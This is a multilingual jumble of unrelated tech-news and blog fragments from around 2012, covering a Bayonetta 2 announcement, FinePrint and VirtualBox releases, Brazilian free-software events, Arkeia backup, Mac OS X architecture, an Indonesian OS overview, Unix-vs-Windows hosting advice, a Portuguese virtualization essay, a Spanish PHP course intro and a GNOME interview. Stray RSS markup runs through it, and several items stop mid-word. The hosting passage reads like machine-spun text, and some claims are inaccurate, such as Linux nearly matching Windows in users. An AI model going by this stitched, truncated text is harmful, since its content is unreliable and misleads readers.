Если она в свое время пришлась по душе и вам, то у нас отличные новости – недавно в рамках конференции Nintendo Direct состоялся анонс сиквела. И плохая новость – так как серия перешла из рук SEGA в нежные объятия Nintendo, последняя решила сделать Bayonetta 2 эксклюзивом для Wii U. Остается надеяться, что исключительные права на проект у новой консоли лишь временно. Никаких подробностей больше не раскрыто, зато вы можете ознакомиться с коротким тизером игры. 	 	             2012-09-14 12:19    FinePrint 7.10: помощник при печати документов        	 	 	Новая версия программы  FinePrint – отличного помощника для тех, кому по роду своей деятельности приходится иметь дело с редактированием всевозможных документов и выводом их на печать.   Утилита расширяет возможности любых принтеров при печати документов, добавляя такие функции как предварительный просмотр, печать нескольких страниц на одном  листе, создание брошюр, автоматическая   вставка заголовка, создание фирменных бланков и т.п. С помощью FinePrint можно также печатать водяные знаки и печати. Результат работы может быть сохранен в форматах  *.bmp,  *.tiff,  *.emf или   *.jpeg. 	 	             2012-09-14 11:44    Артбук Bioshock: Infinite        	 	 	Вы – любитель Bioshock и с нетерпением ожидаете выхода новой части? Тогда эта новость для вас. Силами издательства Dark Horse свет увидит 184-страничный артбук в твердом переплете – The Art of Bioshock: Infinite. В этой книге есть все, чтобы порадовать фанатскую душу: концепт-арты, дизайны персонажей на разных стадиях работы, скетчи и прочие визуальные материалы. А комментарии и рассказы о том, как и почему был выбран тот или иной вариант, пишет сам Кен Левайн (Ken Levine), благодаря которому и появилась серия. 	 	             2012-09-14 11:02    VirtualBox 4.2.0 лучше работает с Windows 8        	 	 	Вышла обновленная версия мощного средства для виртуализации Oracle VM VirtualBox.

¿Quieres probar un programa pero no te atreves por si dañas tu sistema operativo? ¿Te gustaría tener otro sistema operativo pero sin quitar el tuyo? ¿Imaginas probar Windows Vista desde tu XP? 
 
Todo esto es posible con VirtualBox, una utilidad gratuita que crea un ordenador virtual dentro del tuyo, con su sistema operativo totalmente independiente. 
 
De esta forma, podrás crear ‘máquinas virtuales’ con diferentes sistemas operativos y así tener a tu disposición un Windows 95, un Vista, un 2000 un XP o incluso un Linux. Todo desde tu sistema operativo actual. 
 
Para utilizarlo, primero deberás conseguir o crear tu mismo una máquina virtual del sistema operativo que desees, después, cargarla con el programa y listo, arrancará como si de un nuevo sistema operativo se tratase. 
 
Por cierto, el programa no ocupa demasiado, pero ten presente que las máquinas virtuales suelen ocupar bastante espacio, fácilmente de cuatro a seis gigabytes. 
 
Sistemas operativos virtuales: 
Windows (98, NT 4.0, 2000, XP, Server 2003, Vista, Server 2008), DOS/Windows 3.x

  <title><![CDATA[Eventos no Oeste Catarinense: OeSC-Livre e TecLand vem aí!]]></title>
  <summary><![CDATA[A correria anda grande para todos os lados, mas com muita persistência foi possível concretizar dois eventos muito bons para as próximas semanas aqui no "velho Oeste" de Santa Catarina. Se estiver pela região nestas datas, não deixe de comparecer!  Já no próximo sábado dia 22/9, com o apoio da Unoesc São Miguel teremos o II BootCamp OeSC-Livre em São Miguel do Oeste. Haverão outras atividades acadêmicas na Unoesc antes do sábado, porém o sábado inteiro foi reservado para a programação do OeSC-Livre. Dê uma olhada na grade e já agende a sua presença! A inscrição no evento custa R$15 mais 1kg de alimentos não perecíveis, que serão arrecadados e doados a uma instituição de caridade de São Miguel. Vou participar com uma palestra sobre Software Livre em uma perspectiva histórica da Indústria de Software.  Algumas semanas depois, no sábado dia 13/10, teremos na UCEFF em Chapecó o II Encontro TecLand, focado em Segurança da Informação. O ponto alto deste evento será uma palestra de nível internacional, originalmente apresentada na BlackHat Las Vegas 2012. Eu vou apresentar uma palestra sobre os mecanismos de segurança ativos por default no OpenBSD. Olhe a grade de palestras, e então se surpreenda: todo aquele conhecimento e contato com profissionais de alto nível, por apenas 2kg de alimentos não perecíveis! Imperdível!  Vejo vocês nestes sábados recheados de tecnologia!]]></summary>

  <title><![CDATA[Plataformas para backup]]></title>
  <summary><![CDATA[Arkeia Software, proveedor de soluciones de backup en red líderes por rapidez, facilidad de uso y coste, anuncia una actualización del soporte para diez plataformas. Esta decena es una pequeña parte de las más de doscientas plataformas protegidas por Arkeia Network Backup, incluyendo los sistemas operativos Windows, Mac, Linux, Netware, Solaris, AIX, BSD y HP-UX y sus variantes, así como los entornos virtuales VMware, Hyper-V y Xen. 
Al usar una única solución de backup de red a la hora de salvaguardar todas las plataformas se contribuye a reducir costes y complejidad, ya que solo se necesita gestionar un entorno y no se requiere compartir recursos de almacenamiento. El amplio soporte de plataformas maximiza la protección de datos porque es posible aplicar una misma política a todas las plataformas, ya sean físicas o virtuales, y emplear un solo mecanismo para trasladar datos ‘offsite’. 
El director general de Arkeia Software, Bill Evans, afirma que: “Arkeia ha sido reconocida mundialmente por haber sido la primera compañía en ofrecer una solución de backup en red profesional para Linux en 1999. Desde entonces, hemos extendido la gama de plataformas protegidas a más de doscientos pares de procesadores y sistemas operativos. Creemos que este amplio soporte es la mejor apuesta posible para soluciones de backup para las pequeñas y medianas empresas. Nuestros clientes también se benefician de la disminución de costes e incremento de fiabilidad al salvaguardar plataformas físicas y virtuales con una solución completa”. Esta interesante propuesta de Arkeia incluye el servicio de soporte a través de servidores de backup para múltiples generaciones de agentes de backup (normalmente durante ocho años). Este soporte, líder en la industria, permite a los clientes actualizar los servidores sin necesidad de tener que actualizar los agentes. En la actualidad, los servidores Arkeia v 9.1 soportan agentes para v9.0, v8.2, v8.1, v8.0, v7.0, v6.0, v5.3, v5.2 y v5.1. 
Esta compatibilidad ‘backward’ reduce los gastos al dotar a los administradores de control total en la elección de las actualizaciones de los agentes y Como un único servidor de backup Arkeia puede proteger cientos de clientes, es posible implantar versiones de agentes “mixtos”. 
Calendario de disponibilidad Próximas y recientes entregas de soporte de plataformas: 

Servidores y agentes de backup Ubuntu 12.04 (Abril 2012)
Servidores y agentes de backup Fedora 17 (Mayo 2012)
Servidores y agentes de backup OpenBSD 5.1 (Mayo 2012)
Agentes de backup Mac OS X 10.8 (Agosto 2012)
Servidores multimedia y agentes de backup Windows Server 2012 (Septiembre 2012)
Agentes de backup Windows 8 (Septiembre 2012)

  <summary><![CDATA[The history of Mac OS X is really a pleasant to read, I'm always impressed by these kind of stories, it was the beginning of the personnal computer, these guys have built what is used today by millions of people ! amazing  So, as I understand, Mac OS X as we know it today is build from many part of different kernel, issued from different team and different goal developped since 1970 to around 2000.  Here is the (incomplete) architecture of the system (in fact, the firmware is not in the kernel but I think it's important to keep it there to have a better view just upper the hardware).   +==============================================+ | KERNEL (1..n files)                          | +----------------------------------------------+ | Darwin :                                     | | - Collection of functionnalities             | | - Composed by a part (integral or no) of :   | |   * NEXTSTEP                                 | |   * OPENSTEP                                 | |   * Mach                                     | |   * FreeBSD, OpenBSD, other xxxBSD           | |   * GNU sw suite                             | |   * xFree86                                  | +----------------------------------------------+ | xnu :                                        | | -                                            | +==============================================+ | Bootloader (File) :                          | | - BootX file (for PowerPC)                   | | - boot.efi (for x86)                         | | -> launch the kernel                         | +==============================================+ | Firmware (ROM) :                             | | - OpenFirmware (for PowerPC)                 | | - Extensible Firmware Interface (for x86)    | | -> execution (programmable) environment      | | -> execute the bootloader                    | +==============================================+]]></summary>

  <title><![CDATA[BSD machine fixed!]]></title>
  <summary><![CDATA[So, I swapped a known working motherboard into the BSD machine.  It now works.  I also decided to use a quad core AMD AM2+ CPU that I had sitting around.  That's all I changed.  I'd originally thought the problem was related to the hard disk.  So, I decided the night before to disconnect the drives (it has two SATA drives), to determine if it were the real issue.  It still experienced the same symptoms after boot-up attempts, which told me it wasn't a hard disk issue.  I also swapped out the RAM with a known working chip with the same results when trying to boot-up.   So, either the the old CPU (a dual-core AMD...I forget the model) died or something on the motherboard died (or maybe there was a short somewhere?).  I left it running a live instance of Linux Mint, just to see if it stays stable over the next 24 hours.  Next, I need to reinstall FreeBSD (wondering if I should try some others as well, such as OpenBSD or Mint).  I wiped the drive, thinking that there was some corruption issue...shouldn't have done that.]]></summary>

Microsoft WindowsOS buatan Microsoft Corp. ini memiliki user interface yang mudah dimengerti dan dukungan software yang luas. Banyak produsen hardware menyarankan memakai OS ini. OS ini mempunyai kelemahan yaitu VIRUS nya yang bermilyar-milyar jenisnya. Serta harga yang mahal. Merupakan OS dengan pemakai terbanyak di dunia saat ini.   Sistem operasi windows pertama kali diperkenalkan tahun 1985.  Semulanya sistem operasi windows ini diperkenalkan dengan nama  Interface Manager. Pemakaian sistem operasi ini pada awalnya tidak terlalu menarik . Ini terjadi hingga diperkenalkan sistem operasi windows versi 3.0 pada bulan mei 1990.  2. GNU LinuxSistem operasi yang didasarkan pada Open Source (Bebas Milik). Sistem Operasi ini diperkenalkan oleh Linus Torvald dan berkembang sedemikian cepatnya sehingga hampir bisa melampaui jumlah pengguna Windows di dunia. Memiliki banyak jenis Desktop seperti KDE, Gnome, XFCE dst. Juga banyak jenisnya seperti UBUNTU, MANDRIVA, DEBIAN, GOOGLE OS dst.   3. MAC OSXJika kamu sedang mencari Operating System yang stabil dengan Interface yang friendly dan powerful, Mac OS X bisa menjadi salah satu pilihannya. Meskipun FreeBSD telah mempunyai interface desktop untuk para profesional komputer, namun keliatannya kurang cocok untuk para paraniod, kakek-kakek, maupun nenek-nenek. Mac OS X lebih cocok untuk mereka karena mempunyai desain yang sangat intuitif. Mereka dapat langsung menggunakannya tanpa harus banyak berpikir. Mac OS menyertakan banyak hal yang sebenarnya tidak diperlukan untuk menjalankan sebuah server internet, serta hanya dapat berjalan pada hardware Apple. Sehingga, untuk kerperluan server murah dan powerfull, Mac OS tidak direkomendasikan. Meskipun, anda tidak dapat melihat source code GUI interface Mac OS, anda tetap dapat melihat source code BSD yang ada didalamnya. Apple telah me-releasenya dengan nama kode Darwin.  4. UNIX UNIX adalah Sistem Operasi yang diciptakan oleh Ken Thompson dan Dennis Ritchie, dikembangkan oleh AT&T Bell Labs. UNIX didesain sebagai Sistem Operasi yang portabel, Multi-Tasking dan Multi-User. Sistem Operasi UNIX lebih menekankan diri pada Workstation dan Server, Karena faktor ketersediaan dan kompatibilitas yang tinggi menyebabkan UNIX dapat digunakan, disalin dan dimodifikasi sehingga UNIX pun dikembangkan oleh banyak pihak dan menyebabkan banyak sekali varian dari UNIX ini.UNIX sendiri ditulis dalam bahasa C sehingga UNIX pun mirip dengan DOS yaitu Line/Text Command Based selain itu UNIX pun merupakan Sistem Operasi yang secure dibanding dengan Sistem Operasi lain, karena setiap file, direktori, user dan group memiliki set izin tersendiri untuk diakses. Karena adanya dukungan Proyek GNU, maka selanjutnya UNIX berkembang menjadi LINUX (Salah satu varian UNIX).  5. BSD OS (OPEN BSD)OpenBSD adalah cabang dari NetBSD sejak tahun 1996, tujuan utama adalah membuat OS BSD yang paling aman. OpenBSD adalah BSD yang pertama kali men-support hardware−accelerated cryptography (membolehkan untuk men-encrypt dan decrypt informasi pada waktu yang singkat), para developernya sangat bangga karena faktanya, default instalasi OpenBSD tidak dapat di-hack selama 4 tahun!!Para OpenBSD mania telah meng-audit seluruh code OpenBSD, memperbaiki lubang-lubang security yang mungkin dapat diexploitasi. Namun, dari sisi user-friendly, OpenBSD tidak seperti FreeBSD. 6. Sun SolarisSolaris adalah salah satu UNIX yang paling dikenal dunia. Solaris dibuat oleh Sun Microsystem. Solaris berjalah pada high−end hardware yang dapat mendukung puluhan processor, GB RAM, serta harddisk. Ia banyak digunakan sebagai platform oleh aplikasi enterprise, seperti Oracle. Solaris didesain untuk berjalan pada processor SPARC yang diproduksi oleh SUN. Karena SUN mengontrol sendiri hardware dan software, mereka dapat mengembangkan system denga]]></summary>

Each have their merits, so the first point you should feel about when making this decision is if you are seeking for stability, or ease of use.  UNIX based servers are normally superior in the website up-time and stability locations than Windows systems. Even so, whilst they want to be rebooted more typically, Windows servers are typically less complicated to administer and use. 
 
Several newbies to internet hosting will be confused more than the pros and cons of the different operating systems. While, Unix is more stable and secure it makes use of a command line interface for administration. This interface, which is like the original MS-DOS interface, can be difficult to comprehend to a website newbie. Also, in order to preserve a UNIX machine stable, one particular ought to update the kernel and software program frequently, a process which is more hard than Windows.  This however, can be made just as straightforward to do if your internet host has excellent administration software. 
 
Another thing to take into account when deciding on which operating technique to use is regardless of whether you will be utilizing scripting. If so what type? For example, if you will be utilizing a dynamic web site, and determine that you want to go Perl as your language of selection then UNIX should be your operating program of decision. This is also correct for languages such as PHP, and Pythlon. On the other hand, if you choose to go for an ASP based web site then you must select Windows.

  <title><![CDATA[Virtualização: Evolução, Aplicação e Ferramentas]]></title>
  <summary><![CDATA[INTRODUÇÃO

 

Para
começar a falar de virtualização, é preciso entender o que é virtual.  Virtual é algo simulado, abstrato, que não se
toca, como o sistema operacional, Facebook, vídeos do Youtube, etc. No nosso
caso, trataremos da criação de um sistema operacional virtualizado dentro de
outro sistema operacional instalado realmente no hardware do computador.

A
virtualização permite que sejam iniciados dentro de um mesmo computador, varias
instancias de sistemas operacionais, podendo ser iguais ou totalmente
diferentes. Estes Sistemas “visitantes” são gerenciados por um software
conhecido como VMM (Virtual Machine Monitor) ou hypervisor,
que fornece ao S.O. a abstração da máquina virtual, controlando o acesso aos
dispositivos de hardware. Em uma virtualização é possível controlar a
quantidade do uso do processador, de memória e espaço em disco que cada sistema
virtualizado disponibilizará para uso.

 

 

EVOLUÇÃO

 

A ideia de virtualização surgiu em meados do
ano de 1960 onde os gigantes computadores da época conseguiam atingir um alto
processamento, mas dependiam das lentas interfaces humanas para geri-los, desta
forma começou a trabalhar com processos em paralelos criando a terminologia time sharing que significa
compartilhamento do tempo. 

 

Segundo (JEANNA, 2009), em 1960, a IBM
desenvolveu um mainframe chamado de System/360™, que virtualizava todas as
relações de sistema através do Monitor Virtual ou "VM" e depois
chamado de Supervisor, resultando nos dias atuais de hypervisor, que substituiu
o ser humano para gerenciar estes processos.

 

Até a década de 70,
a virtualização atuava no sentido de viabilizar computadores pessoais até
então muito caros. Os antigos mainframes eram divididos através de time-sharing (tempo
compartilhado) entre usuários que usavam ambientes de aplicação totalmente
diferentes. No entanto, com os avanços da tecnologia implicando em diminuição
dos preços, o acesso às máquinas se tornou mais barato, essa técnica perdeu
força. A indústria de computadores pessoais evolui de forma a difundir a
computação pelo mundo. Adquirir um computador já não era tão custoso e, por
vezes, era mais interessante utilizar uma máquina por processo. Um programa
executado em um ambiente virtual pode ser menos eficiente que se executado
direto em uma máquina real, pois a virtualização tem um limite físico. Logo,
essa técnica foi parcialmente superada nas décadas de 80 e 90. No caminhar
dessa evolução, então, os computadores passaram a ter muita capacidade em pouco
preço. Em muitos casos passou a ser viável ter um processador com a capacidade
muito maior que a necessária, o que gerou muita ociosidade. A virtualização
ressurgiu a fim de aproveitar esses recursos. Ainda, com a evolução das redes
de computadores usuários podem utilizar máquinas virtuais remotas. Outros
fatores também influenciam esse crescente interesse. Máquinas virtuais criam
aspectos interessantes quanto à segurança, confiabilidade, disponibilidade,
balanceamento de carga e suporte a softwares legados. Esses últimos são
programas muito antigos e de difícil atualização, projetados para funções
críticas dos sistemas computacionais e, naturalmente, desconhecem invenções
mais recentes (Otto Duarte).



 

 

APLICAÇÃO

 

A
virtualização pode ser utilizada segundo (Diogo, 2008), na consolidação de servidores, que consiste em usar uma
máquina física com diversas máquinas virtuais, sendo uma para cada servidor.
Essa nova abordagem garante o isolamento dos servidores e apresenta as
vantagens de aumentar a taxa de utilização de servidores, reduzir os custos
operacionais, criar ambientes mais flexíveis e reduzir custos de administração
de TI. O ponto mais importante da consolidação de servidores é o melhor
aproveitamento dos recursos, já que se existem n servidores com uma taxa de utilização x, tal que x < 100%, é menos custoso e mais
vantajoso consolidar os n servidores em apenas um, com taxa de
utilização de n.x, desde
que n.x < 100%.

Outro
principal exemplo da utilização da virtualização pode ser visto em laboratórios
de ensino, onde o objetivo é criar um ambiente que isole o aluno da maquina
física, pois o ambiente virtual pode ser facilmente recuperado após uma falha,
diminuindo a necessidade de manutenção das maquinas, e também com a vantagem de
se poder trabalhar com formatação e configuração do sistema operacional sem
envolver a reinstalação das maquinas.

 

As
principais ferramentas disponíveis no mercado são:

 



 

VMWARE: Foi
realmente o responsável por popularizar a tecnologia de virtualização em
pequenas empresas e usuários domésticos. 

 

Dentre os sistemas que você pode rodar, com
suporte oficial, no VMware Player estão: 

Windows: 3.1, 95, 98, ME, 2000, 2003, 2008,
NT, XP, Vista e 7;

versões 32 quanto 64 Bits;

Netware 5 e 6;

Solaris: 8 e 9 de forma experimental, 10 nas
versões 32 e 64 Bit;

Outros: MS-DOS e FreeBSD.

 

 

 



 

 

VIRTUALBOX: É um programa de código aberto, desenvolvido hoje pela sua comunidade de
usuários com suporte da Oracle, atual desenvolvedora do software.

  <summary><![CDATA[Buenas aqui os dejo un curso completisimo de php desde 0 haber que os parece.Os dejo una introduccion del Curso podeis descargarlo al final del post 
 
 


 
  
 
 
 
Descarga de Tutorial Completa
 
 
 
 
 
 

 

 

Capítulo 1. Introducción

 

¿Qué es PHP?

 

PHP (acrónimo de "PHP: Hypertext Preprocessor") es un lenguaje de "código abierto" interpretado,

 

de alto nivel, embebido en páginas HTML y ejecutado en el servidor.

 

Una respuesta corta y concisa, pero, ¿qué significa realmente? Un ejemplo nos aclarará las cosas:

 

Ejemplo 1-1. Un ejemplo introductorio

 

<html>

 

<head>

 

<title>Ejemplo</title>

 

</head>

 

<body>

 

<?php

 

echo "Hola, ¡soy un script PHP!";

 

?>

 

</body>

 

</html>

 

Puede apreciarse que no es lo mismo que un script escrito en otro lenguaje de programación como

 

Perl o C -- En vez de escribir un programa con muchos comandos para crear una salida en HTML,

 

escribimos el código HTML con cierto código PHP embebido (incluido) en el mismo, que producirá

 

cierta salida (en nuestro ejemplo, producirá un texto). El código PHP se incluye entre etiquetas

 

especiales de comienzo y final que nos permitirán entrar y salir del modo PHP.

 

Lo que distingue a PHP de la tecnología Javascript, la cual se ejecuta en la máquina cliente, es que

 

el código PHP es ejecutado en el servidor. Si tuviésemos un script similar al de nuestro ejemplo en

 

nuestro servidor, el cliente solamente recibiría el resultado de su ejecución en el servidor, sin

 

ninguna posibilidad de determinar qué código ha producido el resultado recibido. El servidor web

 

puede ser incluso configurado para que procese todos los archivos HTML con PHP.

 

Lo mejor de usar PHP es que es extremadamente simple para el principiante, pero a su vez, ofrece

 

muchas características avanzadas para los programadores profesionales. No sienta miedo de leer la

 

larga lista de características de PHP, en poco tiempo podrá empezar a escribir sus primeros scripts.

 

Aunque el desarrollo de PHP está concentrado en la programación de scripts en el lado del servidor,

 

se puede utilizar para muchas otras cosas. Siga leyendo y descubra más sobre PHP en la sección

PHP puede hacer cualquier cosa que se pueda hacer con un script CGI, como procesar la

 

información de formularios, generar páginas con contenidos dinámicos, o enviar y recibir cookies.

 

Y esto no es todo, se puede hacer mucho más.

 

Existen tres campos en los que se usan scripts escritos en PHP.

 

• Scripts del lado del servidor. Este es el campo más tradicional y el principal foco de trabajo.

 

Se necesitan tres cosas para que esto funcione. El intérprete PHP (CGI ó módulo), un

 

servidor web y un navegador. Es necesario correr el servidor web con PHP instalado. El

 

resultado del programa PHP se puede obtener a través del navegador, conectándose con el

 

servidor web. Consultar la sección Instrucciones de instalación para más información.

 

• Scripts en la línea de comandos. Puede crear un script PHP y correrlo sin ningún servidor

 

web o navegador. Solamente necesita el intérprete PHP para usarlo de esta manera. Este tipo

 

de uso es ideal para scripts ejecutados regularmente desde cron (en *nix o Linux) o el

 

Planificador de tareas (en Windows). Estos scripts también pueden ser usados para tareas

 

simples de procesamiento de texto. Consultar la sección Usos de PHP en la línea de

 

comandos para más información.

 

• Escribir aplicaciones de interfaz gráfica. Probablemente PHP no sea el lenguaje más

 

apropiado para escribir aplicaciones gráficas, pero si conoce bien PHP, y quisiera utilizar

 

algunas características avanzadas en programas clientes, puede utilizar PHP-GTK para

 

escribir dichos programas. También es posible escribir aplicaciones independientes de una

 

plataforma. PHP-GTK es una extensión de PHP, no disponible en la distribución principal.

 

Si está interesado en PHP-GTK, puedes visitar las páginas web del proyecto.

 

PHP puede ser utilizado en cualquiera de los principales sistemas operativos del mercado,

 

incluyendo Linux, muchas variantes Unix (incluyendo HP-UX, Solaris y OpenBSD), Microsoft

 

Windows, Mac OS X, RISC OS y probablemente alguno más. PHP soporta la mayoría de servidores

 

web de hoy en día, incluyendo Apache, Microsoft Internet Information Server, Personal Web

 

Server, Netscape e iPlanet, Oreilly Website Pro server, Caudium, Xitami, OmniHTTPd y muchos

 

otros. PHP tiene módulos disponibles para la mayoría de los servidores, para aquellos otros que

 

soporten el estándar CGI, PHP puede usarse como procesador CGI.

 

De modo que, con PHP tiene la libertad de elegir el sistema operativo y el servidor de su gusto.

 

También tiene la posibilidad de usar programación procedimental o programación orientada a

 

objetos. Aunque no todas las características estándar de la programación orientada a objetos están

 

implementadas en la versión actual de PHP, muchas bibliotecas y aplicaciones grandes (incluyendo

 

la biblioteca PEAR) están escritas íntegramente usando programación orientada a objetos.

 

Con PHP no se encuentra limitado a resultados en HTML. Entre las habilidades de PHP se incluyen:

 

creación de imágenes, archivos PDF y películas Flash (usando libswf y Ming) sobre la marcha.

 

Tambié puede presentar otros resultados, como XHTM y archivos XML. PHP puede autogenerar

 

éstos archivos y almacenarlos en el sistema de archivos en vez de presentarlos en la pantalla.

 

Quizás la característica más potente y destacable de PHP es su soporte para una gran cantidad de

 

bases de datos. Escribir un interfaz vía web para una base de datos es una tarea simple con PHP. Las

 

siguientes bases de datos están soportadas actualmente:

 

Adabas D Ingres Oracle (OCI7 and OCI8)

 

dBase InterBase Ovrimos

 

Empress FrontBase PostgreSQL

 

FilePro (readonly)

 

mSQL Solid

 

Hyperwave Direct MS-SQL Sybase

 

IBM DB2 MySQL Velocis

 

Informix ODBC Unix dbm

 

También contamos con una extensión DBX de abstracción de base de datos que permite usar de

 

forma transparente cualquier base de datos soportada por la extensión. Adicionalmente, PHP

 

soporta ODBC (el Estándar Abierto de Conexión con Bases de Datos), asi que puede conectarse a

 

cualquier base de datos que soporte tal estándar.

 

PHP también cuenta con soporte para comunicarse con otros servicios usando protocolos tales como

 

LDAP, IMAP, SNMP, NNTP, POP3, HTTP, COM (en Windows) y muchos otros. También se

 

pueden crear sockets puros. PHP soporta WDDX para el intercambio de datos entre lenguajes de

 

programación en web. Y hablando de interconexión, PHP puede utilizar objetos Java de forma

 

transparente como objetos PHP Y la extensión de CORBA puede ser utilizada para acceder a

 

objetos remotos.

 

PHP tiene unas características muy útiles para el procesamiento de texto, desde expresiones

 

regulares POSIX extendidas o tipo Perl hasta procesadores de documentos XML. Para procesar y

 

acceder a documentos XML, soportamos los estándares SAX y DOM. Puede utilizar la extensión

 

XSLT para transformar documentos XML.

 

Si usa PHP en el campo del comercio electrónico, encontrará muy útiles las funciones Cybercash,

 

CyberMUT, VeriSign Payflow Pro y CCVS para sus programas de pago.

 

Para terminar, contamos con muchas otras extensiones muy interesantes, las funciones del motor de

 

búsquedas mnoGoSearch, funciones para pasarelas de IRC, utilidades de compresión (gzip, bz2),,

 

conversión de calendarios, traducción .....

 

Como puede apreciar, esta página no es suficiente para enumerar todas las características y

 

beneficios que PHP ofrece. Consulte las secciones Instalació

  <title><![CDATA[What’s going on with GNOME?]]></title>
  <summary><![CDATA[Follow @LinuxUserMag 
Frederic Peters, the current GNOME Release Manager, is 33 and lives in Brussels. He still remembers his very first contribution to GNOME: “That was the conversion of Havoc Pennington’s book (GNOME and GTK+ Advanced Development, GGAD for short) from whatever it was written in to DocBook in 1999. At that time, I was still at school and I had made a few contributions to Free Software, the most important one being a Debian Developer.” But Peters didn’t get proerly involved in GNOME until sometime later. It took several years and various adventures in his real life before he came back to the project – in 2006 – thanks to the GNOME Love initiative. 
“Luis Villa had comments on the difficulty of setting up a build environment, and how useful it would be to track build failures so they wouldn’t have to wait for a beginner to stumble upon them, so I started such a system. Later on we met at GUADEC and founded the Build brigade, an effort to automate discovery and reporting of GNOME build errors, which would make testing of GNOME’s development version easy for everyone. Various people helped (my thanks to Iago Toral Quiroga and John Carr!) and we got build.gnome.org up and running.” 
What Peters did then was actually a precursor of his current position as GNOME Release Manager. As the developers had build.gnome.org running, they needed to keep an eye on it and fix failures in various modules. “This gave me a good overview of the GNOME project, in terms of code as well as in terms of people. I believe this is still what I do as release manager nowadays: knowing things left and right, pointing whoever needs it to the right place or person, and so on. On top of this, there is some higher level management, definitely shared between the members of the release team. Examples of these tasks are defining the exact schedule, tracking blocker bugs, making sure the releases appear on time, and other such things.” 
Frederic Peters
New design
While GNOME 3 has a radically different design than GNOME 2, we can’t say the same about the applications. However, in GNOME 3.4 the developers began to have applications adopt a design fit for GNOME 3. Of course this was the case for the new applications like Documents and Contacts, but it also happened to existing applications. For instance, the web browser Epiphany morphed into Web. “In 3.6 this trend will persist, with more applications being redesigned,” Peters maintains. 
While KDE offers various workspaces, each for a specific form factor, such as Plasma Desktop for the classical desktop, Plasma Netbook for netbooks, and Plasma Active for mobile devices, GNOME 3 has a one-size-fits-all user interface. Its primary focus is still on the desktop, but according to Peters the GNOME developers do pay attention to also work well on netbooks, as it’s quite close to a desktop. “Moreover, problems like huge dialog windows, which typically manifest themselves on small netbook screens, are a general usability concern. Of course there are also GNOME developers paying attention to tablets and new kinds of devices, and their existence has an influence on the work of the GNOME designers, but at the moment our target is still somehow homogeneous enough to warrant a one-size-fits-all interface.” 
GNOME 3.4 also introduced a new concept, the Application Menu, which offers a global menu for applications. Its use by applications was quite limited in GNOME 3.4, but according to Peters this has expanded in 3.6: “We use the Application Menu in many applications now, from Baobab to Nautilus, from Empathy to Gucharmap, and so on. We noticed several shortcomings in its first implementation in 3.4 and they’re being addressed. For example, there were some problems for sloppy-focus users and in multi-monitor configurations.” 
More and more applications are being redesigned for GNOME 3
Under the hood
Most users see the improvements on the visual side, with GNOME Shell, but GNOME 3 is a lot more. Under the hood there are a lot of libraries, and there has been a tremendous amount of work going on in the graphical toolkit GTK+: “We have new widgets in GTK+, such as GtkLevelBar, a widget to use as a strength indicator, GtkSearchEntry, a subclass of GtkEntry that is set up to be used as a search entry, and GtkMenuButton, a button that pops up a menu. But we have also improved performance, notably in the CSS theming code.” GNOME will also get to use GStreamer 1.0, and many pieces have already been ported to benefit from WebKit 2, although the official switch is only planned for GNOME 3.8. 
In GNOME 3.0, accessibility support was quite limited because of the move to the Clutter framework. This has been improved in each subsequent version, and it now even goes further than in the 2.x times, Peters emphasises: “We will ship GNOME 3.6 with accessibility turned on by default. The most important consequence is that users won’t need to log out and in again after enabling it to activate the screen reader Orca or other accessibility tools. Orca also has improved and we have new high contrast icons (many thanks to Meg Ford for those).” 
Currently, GNOME Documents can handle Google Docs if you have set up a Google account in GNOME Online Accounts. In 3.6, users also get access to documents that are available in Windows Live SkyDrive if you have set up a Windows Live account in GNOME Online Accounts. Moreover, you can also set up an Exchange account in Online Accounts in GNOME 3.6, after which Evolution uses this information to access your email. Another interesting new feature is ‘infinite scrolling’ in Empathy, Peters remarks: “This is a favourite of mine: it offers seamless scrolling to previous discussions.” He can’t say much about the long-term direction of GNOME: “GNOME 3 is still very young, so we are more in a period of getting things settled, and there’s no plan to get things shaken up another time. Perhaps it’s boring not to have long-term plans, but I believe this is because the present is already exciting enough.” 
Online accounts are not restricted anymore to Google...
Criticism

					
						
					A couple of months ago, Linus Torvalds complained in his well-known style about the lack of customisation of GNOME 3, as well as about broken GNOME extensions. Peters has an interesting response to the problems Torvalds faced with GNOME extensions: “His rant about GNOME extensions reminds me of Firefox add-ons a few years ago. You installed some add-ons, you upgraded Firefox, some add-ons broke, or they even broke Firefox, but still that ecosystem of add-ons was and is an important factor for the popularity of Firefox, and nowadays upgrade problems are solved. I wish the same happens with GNOME extensions.” Peters also mentions that Jasper St. Pierre worked quite a bit on extensions this release cycle. He is building a tool to translate the extensions from the online GNOME Shell extensions website into RPM packages for easier deployment for system administrators. 
GNOME 3 also surprised many users because it doesn’t show the poweroff button by default in the user menu, but Suspend. However, GNOME 3.6 will reintroduce this button by default instead of only after pressing the Alt key. According to Peters, this change came for several reasons, including listening to user feedback. “GNOME developers are not interface nazis,” he jokingly says, “but seriously: this change is part of a larger set of modifications to the user menu. Apart from user feedback, another reason is that suspending usually involves another action, such as closing the lid of the laptop.” 
Not everyone was happy when GNOME 3 was released, and although the developers have worked on some of the most important issues people faced, they couldn’t prevent some forks. Two important forks in this situation are Cinnamon and MATE. Cinnamon is a GNOME Shell fork with a more familiar GNOME 2 interface for users that don’t like the GNOME 3 interface, while MATE is a fork of GNOME 2, which really wants to keep developing the traditional GNOME 2 desktop environment. Peters is happy that these forks exist as they serve users, just like other desktop environments such as KDE and XFCE are doing, but he sees some maintainability problems: “Both projects inflicted some painful and difficult job upon themselves, as it looks like they started by importing tarballs into Git repositories, instead of starting from our existing repositories. This means it’s now a totally manual job for them to pick fixes that are happening in our modules. And of course the reverse is also true: if they fix something that could be interesting for GNOME 3, we also have to manually pick the fixes.” 

Funding
The GNOME Foundation is the organization that deals with money in GNOME land, for instance for funding of development and things like developer travel for GUADEC: “Expenses are discussed in its board and the myriad of details are then handled by the travel committee.” Sponsorship comes from various sources. Some core sponsors part of the advisory board are companies like Canonical, Red Hat, SUSE and Google, but also organizations like the Free Software Foundation and the Software Freedom Law Center. “We also get more sponsors for specific events, such as hackfests and conferences.”  
“While corporate sponsorship is our main source of money at the moment, it’s also possible to help as an individual,” Peters emphasises. “We have been running the ‘Friends of GNOME’ program for a few years now, and we are now concluding a special call we made to sponsor accessibility. Our goal is $20000, and we are now at $19010. If you want to donate $25 or more to help us reach our goals, take a look at http://www.gnome.org/friends/.” 
Collaboration with distributions
